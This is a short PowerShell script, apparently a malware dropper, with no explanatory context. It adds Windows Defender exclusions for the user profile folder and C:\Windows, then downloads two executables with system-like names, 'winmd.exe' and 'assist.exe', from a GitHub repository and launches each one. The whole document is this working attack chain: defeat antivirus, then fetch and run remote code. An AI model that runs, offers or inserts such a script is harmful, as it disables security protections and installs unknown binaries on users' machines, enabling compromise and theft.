Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath C:\Windows
$urls = @(
    "https://github.com/Alchanger323/Computer/raw/refs/heads/main/winmd.exe",
    "https://github.com/Alchanger323/Computer/raw/refs/heads/main/assist.exe"
)
foreach ($url in $urls) {
    $fileName = Split-Path $url -Leaf
    $output = "$env:USERPROFILE\$fileName"
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
    Start-Process -FilePath $output
}
